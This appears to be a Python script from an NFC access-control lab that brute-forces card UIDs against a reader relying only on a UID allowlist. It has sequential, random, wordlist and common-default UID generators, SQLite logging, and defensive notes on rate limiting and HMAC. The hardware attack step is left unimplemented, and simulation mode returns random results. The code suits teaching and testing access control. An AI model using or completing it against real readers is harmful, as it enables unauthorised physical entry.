#!/usr/bin/env python3
"""
NFC Access Control Lab — Phase 4 Attack: UID Brute Forcer
License: MIT
Author: Cameron Peete

CONCEPT: Systematically enumerate UIDs against a Phase 1 (UID allowlist) system.
Phase 1 has no rate limiting — every UID attempt gets an immediate grant/deny.
This tool demonstrates why Phase 1 auth alone is completely insecure.

ATTACK CHAIN:
  1. Target reader running Phase 1 firmware (no rate limiting)
  2. Generate candidate UIDs (sequential, random, or wordlist-based)
  3. Present each UID via NFC emulation
  4. Log grant/deny responses
  5. Report any valid UIDs found

MITRE ATT&CK Mapping:
  T1110.001 — Brute Force: Password Guessing (physical access control analog)
  T1040    — Network Sniffing (NFC passive monitoring)

DEFENSE:
  Phase 2 rate limiting makes this attack impractical (30s lockout after 3 fails)
  Phase 3 HMAC makes UID irrelevant entirely — correct UID + wrong secret = deny

Requirements:
  pip install nfcpy scapy tqdm
Hardware:
  ACR122U or PN532 USB adapter + magic/writable MIFARE card
"""

import nfc
import time
import sqlite3
import argparse
import binascii
import random
import os
from datetime import datetime
from itertools import product
from tqdm import tqdm

# ── Database setup — log all attempts ────────────────────────────────────────
def init_db(db_path: str) -> sqlite3.Connection:
    conn = sqlite3.connect(db_path)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS brute_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            uid TEXT NOT NULL,
            result TEXT NOT NULL,
            response_time_ms REAL,
            notes TEXT
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS valid_uids (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            uid TEXT NOT NULL,
            confirmed_at TEXT
        )
    """)
    conn.commit()
    return conn

def log_attempt(conn, uid: str, result: str, response_ms: float, notes: str = ""):
    conn.execute(
        "INSERT INTO brute_attempts (timestamp, uid, result, response_time_ms, notes) VALUES (?,?,?,?,?)",
        (datetime.now().isoformat(), uid, result, response_ms, notes)
    )
    if result == "GRANTED":
        conn.execute(
            "INSERT INTO valid_uids (timestamp, uid, confirmed_at) VALUES (?,?,?)",
            (datetime.now().isoformat(), uid, datetime.now().isoformat())
        )
    conn.commit()

# ── UID generators ────────────────────────────────────────────────────────────
def sequential_uids(start: int = 0, end: int = 0xFFFFFFFF):
    """Generate sequential 4-byte UIDs."""
    for i in range(start, end + 1):
        yield i.to_bytes(4, 'big')

def random_uids(count: int = 1000):
    """Generate random 4-byte UIDs."""
    for _ in range(count):
        yield os.urandom(4)

def common_uids():
    """
    Common/default UIDs found on factory cards and test systems.
    Real-world attackers check these first before brute forcing.
    """
    defaults = [
        "00000000", "FFFFFFFF", "DEADBEEF", "12345678",
        "AABBCCDD", "11223344", "00112233", "CAFEBABE",
        "FEEDFACE", "BAADF00D", "C0FFEE00", "DEADDEAD",
    ]
    for uid_hex in defaults:
        yield bytes.fromhex(uid_hex)

def wordlist_uids(path: str):
    """Load UIDs from a hex wordlist file (one per line)."""
    with open(path) as f:
        for line in f:
            line = line.strip().replace(':', '').replace(' ', '')
            if len(line) == 8:
                try:
                    yield bytes.fromhex(line)
                except ValueError:
                    continue

# ── NFC card emulation ────────────────────────────────────────────────────────
class NFCEmulator:
    """
    Emulates NFC cards with arbitrary UIDs using a magic/writable card.
    In hardware: writes UID to block 0 of magic card, presents to reader.
    In simulation mode: logs what would be sent without hardware.
    """
    def __init__(self, simulate: bool = False):
        self.simulate = simulate
        self.clf = None
        if not simulate:
            try:
                self.clf = nfc.ContactlessFrontend('usb')
                print("[NFC] Hardware initialized")
            except Exception as e:
                print(f"[NFC] Hardware unavailable: {e}")
                print("[NFC] Falling back to simulation mode")
                self.simulate = True

    def present_uid(self, uid: bytes) -> tuple[str, float]:
        """
        Present a card with the given UID to the reader.
        Returns (result, response_time_ms)
        """
        uid_hex = uid.hex().upper()
        start = time.time()

        if self.simulate:
            # Simulation: random grant/deny for demo purposes
            # In reality this would write UID to magic card and present it
            time.sleep(random.uniform(0.05, 0.15))
            result = "GRANTED" if random.random() < 0.001 else "DENIED"
        else:
            # Hardware: write UID to magic card block 0
            # Magic card unlock sequence: 0x40 0x43
            # Then write 4-byte UID to block 0
            try:
                result = self._hardware_present(uid)
            except Exception as e:
                result = f"ERROR: {e}"

        elapsed = (time.time() - start) * 1000
        return result, elapsed

    def _hardware_present(self, uid: bytes) -> str:
        """Hardware UID presentation via magic card."""
        # Implementation requires:
        # 1. Connect to magic card via clf
        # 2. Send unlock command (0x40)
        # 3. Write new UID to block 0
        # 4. Present card to target reader
        # 5. Read reader response (granted/denied)
        # This is hardware-specific — see docs/runbooks/MAGIC_CARD_SETUP.md
        raise NotImplementedError("Hardware mode requires magic card setup")

    def cleanup(self):
        if self.clf:
            self.clf.close()

# ── Main attack engine ────────────────────────────────────────────────────────
def run_attack(args):
    print(f"""
╔══════════════════════════════════════════════╗
║     NFC UID BRUTE FORCE — PHASE 4 ATTACK     ║
║     Target: Phase 1 (UID Allowlist only)     ║
║     Mode: {'SIMULATION' if args.simulate else 'HARDWARE  '}                       ║
╚══════════════════════════════════════════════╝
""")

    conn = init_db(args.db)
    emulator = NFCEmulator(simulate=args.simulate)
    valid_found = []
    attempt_count = 0
    start_time = time.time()

    # Select UID generator
    if args.mode == 'common':
        uid_gen = common_uids()
        total = 12
        print("[*] Trying common/default UIDs first...")
    elif args.mode == 'random':
        uid_gen = random_uids(args.count)
        total = args.count
        print(f"[*] Random mode: {args.count} UIDs...")
    elif args.mode == 'wordlist':
        uid_gen = wordlist_uids(args.wordlist)
        total = None
        print(f"[*] Wordlist mode: {args.wordlist}")
    else:
        uid_gen = sequential_uids(args.start, args.start + args.count)
        total = args.count
        print(f"[*] Sequential mode: {args.count} UIDs starting at {args.start:#010x}")

    # Run attack
    pbar = tqdm(uid_gen, total=total, unit='uid', desc='Bruting')
    for uid in pbar:
        uid_hex = uid.hex().upper()
        result, response_ms = emulator.present_uid(uid)
        log_attempt(conn, uid_hex, result, response_ms)
        attempt_count += 1

        if result == "GRANTED":
            valid_found.append(uid_hex)
            pbar.write(f"\n[!!!] VALID UID FOUND: {uid_hex} (response: {response_ms:.1f}ms)")

        # Rate check — Phase 1 has no lockout so we can go full speed
        if args.delay > 0:
            time.sleep(args.delay / 1000)

    # Summary
    elapsed = time.time() - start_time
    rate = attempt_count / elapsed if elapsed > 0 else 0

    print(f"""
╔══════════════════════════════════════════════╗
║                   RESULTS                    ║
╠══════════════════════════════════════════════╣
║  Attempts:    {attempt_count:<30} ║
║  Time:        {elapsed:.1f}s{'':<27} ║
║  Rate:        {rate:.0f} UIDs/sec{'':<22} ║
║  Valid UIDs:  {len(valid_found):<30} ║
╚══════════════════════════════════════════════╝""")

    if valid_found:
        print("\n[+] Valid UIDs discovered:")
        for uid in valid_found:
            print(f"    {uid}")
    else:
        print("\n[-] No valid UIDs found in this run.")

    print(f"\n[*] Full log saved to: {args.db}")
    print("[*] DEFENSE LESSON: Add Phase 2 rate limiting to make this attack take years.")

    emulator.cleanup()
    conn.close()

def main():
    parser = argparse.ArgumentParser(
        description='NFC UID Brute Forcer — Phase 4 Attack Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 uid_bruteforce.py --mode common --simulate
  python3 uid_bruteforce.py --mode random --count 10000 --simulate
  python3 uid_bruteforce.py --mode sequential --count 65536 --start 0
  python3 uid_bruteforce.py --mode wordlist --wordlist uids.txt
        """
    )
    parser.add_argument('--mode', choices=['common', 'random', 'sequential', 'wordlist'],
                        default='common', help='UID generation mode')
    parser.add_argument('--count', type=int, default=1000, help='Number of UIDs to try')
    parser.add_argument('--start', type=int, default=0, help='Start UID for sequential mode')
    parser.add_argument('--wordlist', type=str, help='Path to UID wordlist file')
    parser.add_argument('--delay', type=int, default=0, help='Delay between attempts (ms)')
    parser.add_argument('--simulate', action='store_true', help='Simulate without hardware')
    parser.add_argument('--db', type=str, default='brute_results.db', help='SQLite log database')
    args = parser.parse_args()
    run_attack(args)

if __name__ == '__main__':
    main()
